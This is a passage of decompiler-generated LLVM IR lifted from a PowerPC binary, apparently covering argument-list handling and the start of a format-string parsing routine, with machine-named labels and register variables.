  store i1 %v2_10006218, i1* %cr7_gt.global-to-local, align 1
  %v2_1000621c = add nuw nsw i32 %v1_10006214, %v4_10006210
  store i32 %v2_1000621c, i32* %r9.global-to-local, align 4
  %v1_10006220 = trunc i32 %v2_1000621c to i8
  store i8 %v1_10006220, i8* %v2_10006210, align 1
  %v0_10006224 = load i1, i1* %cr7_gt.global-to-local, align 1
  %v0_10006244 = load i32, i32* %r10.global-to-local, align 4
  br i1 %v0_10006224, label %dec_label_pc_10006244, label %dec_label_pc_10006228

dec_label_pc_10006228:                            ; preds = %dec_label_pc_10006210
  %v1_10006228 = add i32 %v0_10006244, 8
  %v2_10006228 = inttoptr i32 %v1_10006228 to i32*
  %v3_10006228 = load i32, i32* %v2_10006228, align 4
  store i32 %v3_10006228, i32* %r0.global-to-local, align 4
  %v0_1000622c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000622c = urem i32 %v0_1000622c, 256
  %v1_10006230 = mul nuw nsw i32 %v1_1000622c, 4
  store i32 %v1_10006230, i32* %r11.global-to-local, align 4
  %v1_10006234 = add nuw nsw i32 %v1_1000622c, 2
  store i32 %v1_10006234, i32* %r9.global-to-local, align 4
  %v1_10006238 = trunc i32 %v1_10006234 to i8
  %v2_10006238 = load i32, i32* @r3, align 4
  %v3_10006238 = add i32 %v2_10006238, 76
  %v4_10006238 = inttoptr i32 %v3_10006238 to i8*
  store i8 %v1_10006238, i8* %v4_10006238, align 1
  %v0_1000623c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000623c = load i32, i32* %r0.global-to-local, align 4
  %v2_1000623c = add i32 %v1_1000623c, %v0_1000623c
  store i32 %v2_1000623c, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006258

dec_label_pc_10006244:                            ; preds = %dec_label_pc_10006210
  %v1_10006244 = add i32 %v0_10006244, 4
  %v2_10006244 = inttoptr i32 %v1_10006244 to i32*
  %v3_10006244 = load i32, i32* %v2_10006244, align 4
  %v1_10006248 = add i32 %v3_10006244, 7
  store i32 %v1_10006248, i32* %r9.global-to-local, align 4
  %v1_1000624c = call i32 @__asm_rlwinm(i32 %v1_10006248, i32 0, i32 0, i32 28)
  store i32 %v1_1000624c, i32* %r11.global-to-local, align 4
  %v1_10006250 = add i32 %v1_1000624c, 8
  store i32 %v1_10006250, i32* %r0.global-to-local, align 4
  %v1_10006254 = load i32, i32* %r10.global-to-local, align 4
  %v2_10006254 = add i32 %v1_10006254, 4
  %v3_10006254 = inttoptr i32 %v2_10006254 to i32*
  store i32 %v1_10006250, i32* %v3_10006254, align 4
  %v0_10006258.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006258

dec_label_pc_10006258:                            ; preds = %dec_label_pc_10006228, %dec_label_pc_10006244
  %v0_10006258 = phi i32 [ %v2_1000623c, %dec_label_pc_10006228 ], [ %v0_10006258.pre, %dec_label_pc_10006244 ]
  %v1_10006258 = inttoptr i32 %v0_10006258 to i32*
  %v2_10006258 = load i32, i32* %v1_10006258, align 4
  store i32 %v2_10006258, i32* %r9.global-to-local, align 4
  %v1_1000625c = add i32 %v0_10006258, 4
  %v2_1000625c = inttoptr i32 %v1_1000625c to i32*
  %v3_1000625c = load i32, i32* %v2_1000625c, align 4
  store i32 %v3_1000625c, i32* %r10.global-to-local, align 4
  %v1_10006260 = load i32, i32* %r8.global-to-local, align 4
  %v2_10006260 = inttoptr i32 %v1_10006260 to i32*
  store i32 %v2_10006258, i32* %v2_10006260, align 4
  %v0_10006264 = load i32, i32* %r10.global-to-local, align 4
  %v1_10006264 = load i32, i32* %r8.global-to-local, align 4
  %v2_10006264 = add i32 %v1_10006264, 4
  %v3_10006264 = inttoptr i32 %v2_10006264 to i32*
  store i32 %v0_10006264, i32* %v3_10006264, align 4
  br label %dec_label_pc_100062f0

dec_label_pc_1000626c:                            ; preds = %dec_label_pc_10006204, %dec_label_pc_10006208
  store i32 %v1_100061d4, i32* %r10.global-to-local, align 4
  %v1_10006270 = add i32 %v2_100062d0, 77
  %v2_10006270 = inttoptr i32 %v1_10006270 to i8*
  %v3_10006270 = load i8, i8* %v2_10006270, align 1
  %v4_10006270 = zext i8 %v3_10006270 to i32
  store i32 %v4_10006270, i32* %r11.global-to-local, align 4
  %v2_10006274 = icmp ugt i8 %v3_10006270, 8
  store i1 %v2_10006274, i1* %cr7_gt.global-to-local, align 1
  %tmp29 = icmp ugt i8 %v3_10006270, 7
  br i1 %tmp29, label %dec_label_pc_10006298, label %dec_label_pc_1000627c

dec_label_pc_1000627c:                            ; preds = %dec_label_pc_1000626c
  %v1_1000627c = add i32 %v2_100062d0, 84
  %v2_1000627c = inttoptr i32 %v1_1000627c to i32*
  %v3_1000627c = load i32, i32* %v2_1000627c, align 4
  store i32 %v3_1000627c, i32* %r9.global-to-local, align 4
  %v1_10006280 = mul nuw nsw i32 %v4_10006270, 8
  store i32 %v1_10006280, i32* %r0.global-to-local, align 4
  %v1_10006284 = add nuw nsw i32 %v4_10006270, 1
  store i32 %v1_10006284, i32* %r11.global-to-local, align 4
  %v1_10006288 = trunc i32 %v1_10006284 to i8
  store i8 %v1_10006288, i8* %v2_10006270, align 1
  %v0_1000628c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000628c = add i32 %v0_1000628c, 32
  %v1_10006290 = load i32, i32* %r0.global-to-local, align 4
  %v2_10006290 = add i32 %v1_1000628c, %v1_10006290
  store i32 %v2_10006290, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100062f0

dec_label_pc_10006298:                            ; preds = %dec_label_pc_1000626c
  %v1_10006298 = add i32 %v2_100062d0, 80
  %v2_10006298 = inttoptr i32 %v1_10006298 to i32*
  %v3_10006298 = load i32, i32* %v2_10006298, align 4
  %v1_1000629c = add i32 %v3_10006298, 7
  store i32 %v1_1000629c, i32* %r9.global-to-local, align 4
  %v1_100062a0 = call i32 @__asm_rlwinm(i32 %v1_1000629c, i32 0, i32 0, i32 28)
  store i32 %v1_100062a0, i32* %r9.global-to-local, align 4
  %v1_100062a4 = add i32 %v1_100062a0, 8
  store i32 %v1_100062a4, i32* %r0.global-to-local, align 4
  %v1_100062a8 = load i32, i32* %r10.global-to-local, align 4
  %v2_100062a8 = add i32 %v1_100062a8, 4
  %v3_100062a8 = inttoptr i32 %v2_100062a8 to i32*
  store i32 %v1_100062a4, i32* %v3_100062a8, align 4
  br label %dec_label_pc_100062f0

dec_label_pc_100062b8:                            ; preds = %dec_label_pc_10006204, %dec_label_pc_10006208, %dec_label_pc_100061f0, %dec_label_pc_100061dc
  %v2_100062b8 = inttoptr i32 %v1_100061d4 to i8*
  %v3_100062b8 = load i8, i8* %v2_100062b8, align 1
  %v4_100062b8 = zext i8 %v3_100062b8 to i32
  store i32 %v4_100062b8, i32* %r11.global-to-local, align 4
  %v2_100062bc = icmp ugt i8 %v3_100062b8, 8
  store i1 %v2_100062bc, i1* %cr7_gt.global-to-local, align 1
  %tmp30 = icmp ugt i8 %v3_100062b8, 7
  br i1 %tmp30, label %dec_label_pc_100062dc, label %dec_label_pc_100062c4

dec_label_pc_100062c4:                            ; preds = %dec_label_pc_100062b8
  %v1_100062c4 = add i32 %v2_100062d0, 84
  %v2_100062c4 = inttoptr i32 %v1_100062c4 to i32*
  %v3_100062c4 = load i32, i32* %v2_100062c4, align 4
  store i32 %v3_100062c4, i32* %r0.global-to-local, align 4
  %v1_100062c8 = mul nuw nsw i32 %v4_100062b8, 4
  store i32 %v1_100062c8, i32* %r9.global-to-local, align 4
  %v1_100062cc = add nuw nsw i32 %v4_100062b8, 1
  store i32 %v1_100062cc, i32* %r11.global-to-local, align 4
  %v1_100062d0 = trunc i32 %v1_100062cc to i8
  store i8 %v1_100062d0, i8* %v2_100062b8, align 1
  %v0_100062d4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100062d4 = load i32, i32* %r0.global-to-local, align 4
  %v2_100062d4 = add i32 %v1_100062d4, %v0_100062d4
  store i32 %v2_100062d4, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100062e8

dec_label_pc_100062dc:                            ; preds = %dec_label_pc_100062b8
  %v1_100062dc = add i32 %v2_100062d0, 80
  %v2_100062dc = inttoptr i32 %v1_100062dc to i32*
  %v3_100062dc = load i32, i32* %v2_100062dc, align 4
  store i32 %v3_100062dc, i32* %r9.global-to-local, align 4
  %v1_100062e0 = add i32 %v3_100062dc, 4
  store i32 %v1_100062e0, i32* %r0.global-to-local, align 4
  store i32 %v1_100062e0, i32* %v2_100062dc, align 4
  %v0_100062e8.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100062e8

dec_label_pc_100062e8:                            ; preds = %dec_label_pc_100062c4, %dec_label_pc_100062dc
  %v0_100062e8 = phi i32 [ %v2_100062d4, %dec_label_pc_100062c4 ], [ %v0_100062e8.pre, %dec_label_pc_100062dc ]
  %v1_100062e8 = inttoptr i32 %v0_100062e8 to i32*
  %v2_100062e8 = load i32, i32* %v1_100062e8, align 4
  store i32 %v2_100062e8, i32* %r0.global-to-local, align 4
  %v1_100062ec = load i32, i32* %r8.global-to-local, align 4
  %v2_100062ec = inttoptr i32 %v1_100062ec to i32*
  store i32 %v2_100062e8, i32* %v2_100062ec, align 4
  br label %dec_label_pc_100062f0

dec_label_pc_100062f0:                            ; preds = %dec_label_pc_10006298, %dec_label_pc_1000627c, %dec_label_pc_10006258, %dec_label_pc_100062e8
  %v0_100062f0 = load i32, i32* %r8.global-to-local, align 4
  %v1_100062f0 = add i32 %v0_100062f0, 8
  store i32 %v1_100062f0, i32* %r8.global-to-local, align 4
  %v0_100062f4.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_100062f8.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100062f4

dec_label_pc_100062f4:                            ; preds = %dec_label_pc_100061c0, %dec_label_pc_100062f0
  %v0_100062f8 = phi i32 [ %v2_100062d0, %dec_label_pc_100061c0 ], [ %v0_100062f8.pre, %dec_label_pc_100062f0 ]
  %v0_100062f4 = phi i32 [ %v0_100061c0, %dec_label_pc_100061c0 ], [ %v0_100062f4.pre, %dec_label_pc_100062f0 ]
  %v1_100062f4 = add i32 %v0_100062f4, 1
  store i32 %v1_100062f4, i32* %r7.global-to-local, align 4
  %v1_100062f8 = add i32 %v0_100062f8, 28
  %v2_100062f8 = inttoptr i32 %v1_100062f8 to i32*
  %v3_100062f8 = load i32, i32* %v2_100062f8, align 4
  store i32 %v3_100062f8, i32* %r0.global-to-local, align 4
  %v2_100062fc = icmp slt i32 %v1_100062f4, %v3_100062f8
  %v3_100062fc = icmp sgt i32 %v1_100062f4, %v3_100062f8
  store i1 %v3_100062fc, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_100062fc, label %dec_label_pc_100061c0, label %dec_label_pc_10006348

dec_label_pc_10006308:                            ; preds = %dec_label_pc_10006108
  store i32 -2147483648, i32* %r11.global-to-local, align 4
  %v3_1000630c = icmp ne i32 %v3_10006110, -2147483648
  %v4_1000630c = icmp eq i32 %v3_10006110, -2147483648
  store i1 %v3_1000630c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000630c, label %dec_label_pc_10006314, label %dec_label_pc_10006328

dec_label_pc_10006314:                            ; preds = %dec_label_pc_10006308
  %v1_10006314 = add i32 %v0_10006108, 36
  %v2_10006314 = inttoptr i32 %v1_10006314 to i8*
  %v3_10006314 = load i8, i8* %v2_10006314, align 1
  %v4_10006314 = zext i8 %v3_10006314 to i32
  %v1_10006318 = mul nuw nsw i32 %v4_10006314, 8
  %v2_1000631c = add i32 %v1_10006318, %v1_1000610c
  store i32 %v2_1000631c, i32* %r9.global-to-local, align 4
  %v1_10006320 = add i32 %v2_1000631c, -8
  %v2_10006320 = inttoptr i32 %v1_10006320 to i32*
  %v3_10006320 = load i32, i32* %v2_10006320, align 4
  store i32 %v3_10006320, i32* %r0.global-to-local, align 4
  store i32 %v3_10006320, i32* %v2_10006110, align 4
  %v0_10006328.pre = load i32, i32* @r3, align 4
  %v1_1000632c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006328

dec_label_pc_10006328:                            ; preds = %dec_label_pc_10006308, %dec_label_pc_10006314
  %v1_1000632c = phi i32 [ -2147483648, %dec_label_pc_10006308 ], [ %v1_1000632c.pre, %dec_label_pc_10006314 ]
  %v1_10006344 = phi i32 [ %v0_10006108, %dec_label_pc_10006308 ], [ %v0_10006328.pre, %dec_label_pc_10006314 ]
  %v1_10006328 = add i32 %v1_10006344, 4
  %v2_10006328 = inttoptr i32 %v1_10006328 to i32*
  %v3_10006328 = load i32, i32* %v2_10006328, align 4
  store i32 %v3_10006328, i32* %r0.global-to-local, align 4
  %v3_1000632c = icmp sgt i32 %v3_10006328, %v1_1000632c
  %v4_1000632c = icmp eq i32 %v3_10006328, %v1_1000632c
  store i1 %v3_1000632c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000632c, label %dec_label_pc_10006334, label %dec_label_pc_10006348

dec_label_pc_10006334:                            ; preds = %dec_label_pc_10006328
  %v1_10006334 = add i32 %v1_10006344, 37
  %v2_10006334 = inttoptr i32 %v1_10006334 to i8*
  %v3_10006334 = load i8, i8* %v2_10006334, align 1
  %v4_10006334 = zext i8 %v3_10006334 to i32
  %v1_10006338 = mul nuw nsw i32 %v4_10006334, 8
  %v1_1000633c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000633c = add i32 %v1_10006338, %v1_1000633c
  store i32 %v2_1000633c, i32* %r9.global-to-local, align 4
  %v1_10006340 = add i32 %v2_1000633c, -8
  %v2_10006340 = inttoptr i32 %v1_10006340 to i32*
  %v3_10006340 = load i32, i32* %v2_10006340, align 4
  store i32 %v3_10006340, i32* %r0.global-to-local, align 4
  store i32 %v3_10006340, i32* %v2_10006328, align 4
  %v0_10006348.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10006348

dec_label_pc_10006348:                            ; preds = %dec_label_pc_100062f4, %dec_label_pc_100062f8.preheader, %dec_label_pc_10006328, %dec_label_pc_10006334
  %v0_10006348 = phi i32 [ %v1_10006344, %dec_label_pc_10006328 ], [ %v0_10006348.pre, %dec_label_pc_10006334 ], [ %v0_100062f85, %dec_label_pc_100062f8.preheader ], [ %v0_100062f8, %dec_label_pc_100062f4 ]
  %v1_10006348 = add i32 %v0_10006348, 8
  %v2_10006348 = inttoptr i32 %v1_10006348 to i32*
  %v3_10006348 = load i32, i32* %v2_10006348, align 4
  store i32 %v3_10006348, i32* %r11.global-to-local, align 4
  %v2_1000634c = icmp sgt i32 %v3_10006348, 0
  store i1 %v2_1000634c, i1* %cr7_gt.global-to-local, align 1
  %v0_10006350 = load i32, i32* @lr, align 4
  %tmp31 = icmp sgt i32 %v3_10006348, -1
  call void @__pseudo_cond_branch(i1 %tmp31, i32 %v0_10006350)
  %v0_10006354 = load i32, i32* @r3, align 4
  %v1_10006354 = add i32 %v0_10006354, 16
  %v2_10006354 = inttoptr i32 %v1_10006354 to i32*
  %v3_10006354 = load i32, i32* %v2_10006354, align 4
  store i32 %v3_10006354, i32* %r0.global-to-local, align 4
  %v0_10006358 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006358 = sub i32 0, %v0_10006358
  store i32 %v1_10006358, i32* %r11.global-to-local, align 4
  store i32 32, i32* %r9.global-to-local, align 4
  %v2_10006360 = add i32 %v0_10006354, 8
  %v3_10006360 = inttoptr i32 %v2_10006360 to i32*
  store i32 %v1_10006358, i32* %v3_10006360, align 4
  %v0_10006364 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006364 = load i32, i32* @r3, align 4
  %v2_10006364 = add i32 %v1_10006364, 20
  %v3_10006364 = inttoptr i32 %v2_10006364 to i32*
  store i32 %v0_10006364, i32* %v3_10006364, align 4
  %v0_10006368 = load i32, i32* %r0.global-to-local, align 4
  %v1_10006368 = or i32 %v0_10006368, 8
  store i32 %v1_10006368, i32* %r0.global-to-local, align 4
  %v1_1000636c = call i32 @__asm_rlwinm(i32 %v1_10006368, i32 0, i32 0, i32 30)
  store i32 %v1_1000636c, i32* %r0.global-to-local, align 4
  %v1_10006370 = load i32, i32* @r3, align 4
  %v2_10006370 = add i32 %v1_10006370, 16
  %v3_10006370 = inttoptr i32 %v2_10006370 to i32*
  store i32 %v1_1000636c, i32* %v3_10006370, align 4
  %v0_10006374 = load i32, i32* @r3, align 4
  ret i32 %v0_10006374

; uselistorder directives
  uselistorder i32 %v3_10006328, { 1, 0, 2 }
  uselistorder i32 %v1_1000632c, { 1, 0 }
  uselistorder i32 %v3_100062f8, { 1, 0, 2 }
  uselistorder i32 %v1_100062f4, { 2, 3, 1, 0 }
  uselistorder i32 %v0_100062f8, { 0, 2, 1 }
  uselistorder i32 %v4_100062b8, { 1, 0, 2 }
  uselistorder i32 %v4_10006270, { 1, 0, 2 }
  uselistorder i32 %v0_10006258, { 1, 0 }
  uselistorder i32 %v1_1000622c, { 1, 0 }
  uselistorder i32 %v0_10006244, { 1, 0 }
  uselistorder i8 %v3_10006210, { 1, 0, 2 }
  uselistorder i32 %v1_100061d4, { 0, 2, 1, 3 }
  uselistorder i32 %v3_100061c8, { 4, 1, 0, 3, 2, 8, 5, 7, 6, 10, 9, 11 }
  uselistorder i32 %v0_100061c0, { 1, 0 }
  uselistorder i32 %v2_100062d0, { 5, 3, 4, 1, 2, 6, 7, 0 }
  uselistorder i32 %v0_100062f85, { 1, 0, 2 }
  uselistorder i32 %v4_10006178, { 1, 0, 2 }
  uselistorder i32 %v3_10006168, { 1, 0, 2 }
  uselistorder i32 %v2_10006194, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v4_10006128, { 1, 0, 2 }
  uselistorder i32 %v3_10006110, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v3_10006108, { 1, 0, 2 }
  uselistorder i32 %v0_10006108, { 4, 5, 2, 0, 1, 3, 6, 7, 8 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r7.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 20, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i1* %cr7_gt.global-to-local, { 3, 4, 5, 14, 6, 7, 8, 9, 1, 0, 10, 11, 12, 13, 2, 15, 16, 17, 18, 19 }
  uselistorder label %dec_label_pc_10006348, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10006328, { 1, 0 }
  uselistorder label %dec_label_pc_100062f4, { 1, 0 }
  uselistorder label %dec_label_pc_100062f0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100062e8, { 1, 0 }
  uselistorder label %dec_label_pc_100062b8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000626c, { 1, 0 }
  uselistorder label %dec_label_pc_10006258, { 1, 0 }
  uselistorder label %dec_label_pc_100061c0, { 1, 0 }
  uselistorder label %dec_label_pc_100062f8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100061ac, { 1, 0 }
  uselistorder label %dec_label_pc_10006168, { 1, 0 }
  uselistorder label %dec_label_pc_1000615c, { 1, 0 }
}

define i32 @function_10006378(i32 %arg1) local_unnamed_addr {
dec_label_pc_10006378:
  br label %dec_label_pc_10006384

dec_label_pc_10006384:                            ; preds = %dec_label_pc_10006384, %dec_label_pc_10006378
  %v0_10006384 = phi i32 [ ptrtoint (i32* @global_var_1000e66c.240 to i32), %dec_label_pc_10006378 ], [ %v1_10006384, %dec_label_pc_10006384 ]
  %v1_10006384 = add i32 %v0_10006384, -2
  %v2_10006384 = inttoptr i32 %v1_10006384 to i16*
  %v3_10006384 = load i16, i16* %v2_10006384, align 2
  %v4_10006384 = sext i16 %v3_10006384 to i32
  %v4_10006388 = icmp eq i32 %v4_10006384, %arg1
  %v3_1000638c.not = icmp ule i32 %v1_10006384, ptrtoint (i32* @global_var_1000e654.241 to i32)
  %brmerge = or i1 %v4_10006388, %v3_1000638c.not
  br i1 %brmerge, label %dec_label_pc_10006398, label %dec_label_pc_10006384

dec_label_pc_10006398:                            ; preds = %dec_label_pc_10006384
  %v2_100063a0 = sub i32 %v1_10006384, ptrtoint (i32* @global_var_1000e654.241 to i32)
  %v1_100063a8 = udiv i32 %v2_100063a0, 2
  %v2_100063a8 = and i32 %v2_100063a0, -2147483648
  %v3_100063a8 = or i32 %v1_100063a8, %v2_100063a8
  %v2_100063b0 = add i32 %v3_100063a8, ptrtoint (i32* @global_var_1000e66c.240 to i32)
  %v3_100063b0 = inttoptr i32 %v2_100063b0 to i8*
  %v4_100063b0 = load i8, i8* %v3_100063b0, align 1
  %v5_100063b0 = zext i8 %v4_100063b0 to i32
  ret i32 %v5_100063b0

; uselistorder directives
  uselistorder i32 %v2_100063a0, { 1, 0 }
  uselistorder i32 %v1_10006384, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1000e654.241 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1000e66c.240 to i32), { 1, 0 }
}

define i32 @function_100063b8(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100063b8:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp46 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_100063bc = load i32, i32* @lr, align 4
  store i32 %v0_100063bc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 8, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v1_100063d4 = add i32 %tmp, 16
  %v2_100063d4 = inttoptr i32 %v1_100063d4 to i32*
  %v3_100063d4 = load i32, i32* %v2_100063d4, align 4
  store i32 %v3_100063d4, i32* %r0.global-to-local, align 4
  %v1_100063e4 = and i32 %v3_100063d4, 128
  store i32 %v1_100063e4, i32* %r5.global-to-local, align 4
  %v3_100063e4 = icmp eq i32 %v1_100063e4, 0
  store i32 8, i32* %stack_var_-104, align 4
  %v1_100063ec = add i32 %tmp, 24
  %v2_100063ec = inttoptr i32 %v1_100063ec to i32*
  %v3_100063ec = load i32, i32* %v2_100063ec, align 4
  store i32 %v3_100063ec, i32* @r26, align 4
  br i1 %v3_100063e4, label %dec_label_pc_100063f4, label %dec_label_pc_1000640c

dec_label_pc_100063f4:                            ; preds = %dec_label_pc_100063b8
  %v2_100063f4 = load i32, i32* %arg1, align 4
  %.pre = ptrtoint i32* %stack_var_-104 to i32
  br label %dec_label_pc_10006460

dec_label_pc_10006404:                            ; preds = %dec_label_pc_10006634
  %v1_10006404 = add i32 %v0_10006604, 1
  store i32 %v1_10006404, i32* @r30, align 4
  br label %dec_label_pc_1000664c

dec_label_pc_1000640c:                            ; preds = %dec_label_pc_100063b8
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_10006410 = load i32, i32* %arg1, align 4
  store i32 %v2_10006410, i32* %r7.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_1000641c = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000641c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10006420

dec_label_pc_10006420:                            ; preds = %dec_label_pc_10006450.dec_label_pc_10006420_crit_edge, %dec_label_pc_1000640c
  %v0_10006428 = phi i32 [ %v0_10006428.pre, %dec_label_pc_10006450.dec_label_pc_10006420_crit_edge ], [ %v2_10006410, %dec_label_pc_1000640c ]
  %v0_10006424 = phi i32 [ %v0_10006424.pre, %dec_label_pc_10006450.dec_label_pc_10006420_crit_edge ], [ %v2_1000641c, %dec_label_pc_1000640c ]
  %v0_1000642c = phi i32 [ %v0_10006420.pre, %dec_label_pc_10006450.dec_label_pc_10006420_crit_edge ], [ 0, %dec_label_pc_1000640c ]
  %v1_10006420 = mul i32 %v0_1000642c, 4
  %v2_10006424 = add i32 %v0_1000642c, %v0_10006424
  store i32 %v2_10006424, i32* %r10.global-to-local, align 4
  %v2_10006428 = add i32 %v1_10006420, %v0_10006428
  store i32 %v2_10006428, i32* %r11.global-to-local, align 4
  %v1_1000642c = add i32 %v0_1000642c, 1
  store i32 %v1_1000642c, i32* %r8.global-to-local, align 4
  %v1_10006430 = add i32 %v2_10006428, -4
  %v2_10006430 = inttoptr i32 %v1_10006430 to i32*
  %v3_10006430 = load i32, i32* %v2_10006430, align 4
  store i32 %v3_10006430, i32* %r9.global-to-local, align 4
  %v1_10006434 = trunc i32 %v3_10006430 to i8
  %v3_10006434 = add i32 %v2_10006424, 24
  %v4_10006434 = inttoptr i32 %v3_10006434 to i8*
  store i8 %v1_10006434, i8* %v4_10006434, align 1
  %v0_10006438 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006438 = urem i32 %v0_10006438, 256
  store i32 %v1_10006438, i32* %r9.global-to-local, align 4
  %v0_10006440 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006440 = add i32 %v0_10006440, -4
  %v2_10006440 = inttoptr i32 %v1_10006440 to i32*
  %v3_10006440 = load i32, i32* %v2_10006440, align 4
  store i32 %v3_10006440, i32* %r0.global-to-local, align 4
  %v4_10006444 = icmp eq i32 %v1_10006438, %v3_10006440
  br i1 %v4_10006444, label %dec_label_pc_1000644c, label %dec_label_pc_100068bc

dec_label_pc_1000644c:                            ; preds = %dec_label_pc_10006420
  %v3_1000643c = icmp eq i32 %v1_10006438, 0
  br i1 %v3_1000643c, label %dec_label_pc_10006454, label %dec_label_pc_10006450

dec_label_pc_10006450:                            ; preds = %dec_label_pc_1000644c
  %v0_10006450 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006450 = add i32 %v0_10006450, -1
  store i32 %v1_10006450, i32* %ctr.global-to-local, align 4
  %v2_10006450 = icmp eq i32 %v1_10006450, 0
  br i1 %v2_10006450, label %dec_label_pc_10006454, label %dec_label_pc_10006450.dec_label_pc_10006420_crit_edge

dec_label_pc_10006450.dec_label_pc_10006420_crit_edge: ; preds = %dec_label_pc_10006450
  %v0_10006420.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_10006424.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_10006428.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10006420

dec_label_pc_10006454:                            ; preds = %dec_label_pc_10006450, %dec_label_pc_1000644c
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10006458 = ptrtoint i32* %stack_var_-79 to i32
  br label %dec_label_pc_10006460

dec_label_pc_10006460:                            ; preds = %dec_label_pc_100063f4, %dec_label_pc_10006454
  %v2_10006470.pre-phi = phi i32 [ %.pre, %dec_label_pc_100063f4 ], [ %v2_1000641c, %dec_label_pc_10006454 ]
  %storemerge3 = phi i32 [ %v2_100063f4, %dec_label_pc_100063f4 ], [ %v2_10006458, %dec_label_pc_10006454 ]
  store i32 %storemerge3, i32* %r10.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* @r25, align 4
  store i32 %v2_10006470.pre-phi, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006480

dec_label_pc_1000647c:                            ; preds = %dec_label_pc_1000658c, %dec_label_pc_10006610
  %v0_1000647c = phi i32 [ %v1_10006610, %dec_label_pc_10006610 ], [ %v0_10006574, %dec_label_pc_1000658c ]
  %stack_var_-84.0 = phi i32 [ %stack_var_-84.3, %dec_label_pc_10006610 ], [ %stack_var_-84.2, %dec_label_pc_1000658c ]
  store i32 %v0_1000647c, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10006480

dec_label_pc_10006480:                            ; preds = %dec_label_pc_10006460, %dec_label_pc_1000647c
  %v0_10006494 = phi i32 [ %storemerge3, %dec_label_pc_10006460 ], [ %v0_1000647c, %dec_label_pc_1000647c ]
  %stack_var_-84.1 = phi i32 [ %tmp46, %dec_label_pc_10006460 ], [ %stack_var_-84.0, %dec_label_pc_1000647c ]
  %v1_10006480 = inttoptr i32 %v0_10006494 to i8*
  %v2_10006480 = load i8, i8* %v1_10006480, align 1
  %v3_10006480 = zext i8 %v2_10006480 to i32
  store i32 %v3_10006480, i32* %r0.global-to-local, align 4
  store i32 %v0_10006494, i32* @r30, align 4
  %v3_10006488 = icmp eq i8 %v2_10006480, 42
  br i1 %v3_10006488, label %dec_label_pc_10006490, label %dec_label_pc_100064a0

dec_label_pc_10006490:                            ; preds = %dec_label_pc_10006480
  %v0_10006490 = load i32, i32* %r4.global-to-local, align 4
  %v1_10006490 = mul i32 %v0_10006490, -4
  store i32 %v1_10006490, i32* %r0.global-to-local, align 4
  %v1_10006494 = add i32 %v0_10006494, 1
  store i32 %v1_10006494, i32* @r30, align 4
  %v0_10006498 = load i32, i32* @r1, align 4
